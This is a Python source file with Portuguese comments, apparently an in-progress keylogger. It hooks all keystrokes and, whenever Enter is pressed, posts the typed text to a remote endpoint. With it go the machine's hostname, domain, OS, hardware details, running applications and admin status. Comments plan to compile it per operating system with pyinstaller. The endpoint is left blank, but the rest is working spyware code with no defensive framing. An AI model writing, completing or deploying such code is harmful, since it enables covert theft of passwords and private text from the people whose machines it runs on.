import keyboard
import requests
import socket
import platform
import psutil
import subprocess
import os

'''
###Pensar em aqui ser o entrypoint, dps criar def pra isso
(pyinstaller)Pra isso preciso criar um arquivo compilado afim de evitar incompatibilidade, cada um pra seu SO e arquitetura 32 ou 64bits
response = requests.get('')
with open ('Inj.txt', 'wb') as f:
    f.write(response.content)
    print('safe')
print(response)
'''

URL_ENDPOINT = ## Endponint que recebera a coleta do arquivo via Requisição do arquivo .py

teclas_pressionadas = []

def is_admin():
    resultado = subprocess.run('net localgroup Administradores', shell=True, capture_output=True, text=True)
    if resultado.returncode == 0:
        linhas = resultado.stdout.splitlines()
        if os.getlogin() in linhas[6::]:
            return True
        else:
            return False

def obter_aplicativos_abertos():
    aplicativos_abertos = []
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            aplicativos_abertos.append(proc.info['name'])
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    return aplicativos_abertos

def bytes_para_gb(bytes):
    return bytes // (1024 ** 3)  # Usando divisão inteira para obter um número inteiro

def enviar_dados():
    texto = ''.join(caracter for caracter in teclas_pressionadas if caracter.isalnum() or caracter in "!@#$%^&*()-_=+[]{}|;:'\",.<>/?`~ ")
    hostname = socket.gethostname()
    domain = socket.getfqdn()
    sistema_operacional = platform.platform()
    processador = platform.processor()
    arquitetura = platform.architecture()[0]
    memoria_total = bytes_para_gb(psutil.virtual_memory().total)
    disco_total = bytes_para_gb(psutil.disk_usage('/').total)
    aplicativos_abertos = obter_aplicativos_abertos()

    teclas_especiais = [tecla for tecla in teclas_pressionadas if len(tecla) > 1]
    data = {'texto_digitado': texto,
            'hostname': hostname,
            'domain': domain,
            'SO': sistema_operacional,
            'processador': processador,
            'arquitetura_processador': arquitetura,
            'memoria_total': f'{memoria_total} GB',
            'disco_total': f'{disco_total} GB',
            'teclas_especiais': teclas_especiais,
            'aplicativos_abertos': aplicativos_abertos,
            'Administrador': is_admin()}

    try:
        response = requests.post(URL_ENDPOINT, json=data)
        if response.status_code == 200:
            print('Dados enviados com sucesso para o endpoint Flask!')
        else:
            print('Erro ao enviar os dados para o endpoint Flask. Status code:', response.status_code)
    except Exception as e:
        print('Erro ao enviar os dados para o endpoint Flask:', e)

def capturar_teclas(event):
    tecla = event.name
    if event.event_type == 'down':
        if tecla == 'enter':
            enviar_dados()
            teclas_pressionadas.clear()
        elif tecla == 'space':
            teclas_pressionadas.append(' ')
        elif len(tecla) == 1:
            teclas_pressionadas.append(tecla)
        else:
            teclas_pressionadas.append('[{}]'.format(tecla))

keyboard.hook(capturar_teclas) #chamador de evento

keyboard.wait('esc') #Isso aqui é semelhante a um while true
